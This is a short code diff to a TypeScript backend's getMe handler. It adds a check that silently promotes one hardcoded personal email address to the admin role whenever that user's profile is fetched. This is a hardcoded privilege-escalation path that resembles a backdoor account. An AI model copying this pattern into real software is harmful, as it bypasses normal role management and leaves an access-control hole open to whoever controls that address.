@@ -25,6 +25,12 @@ export const getMe = asyncHandler(async (req: AuthRequest, res: Response, next: 
     return;
   }
 
+  // Ensure admin email is always synced with admin role
+  if (user.email.toLowerCase() === "sahlasherins86+admin@gmail.com" && user.role !== "admin") {
+    user.role = "admin";
+    await user.save();
+  }
+
   res.status(200).json({ user });
 });
 
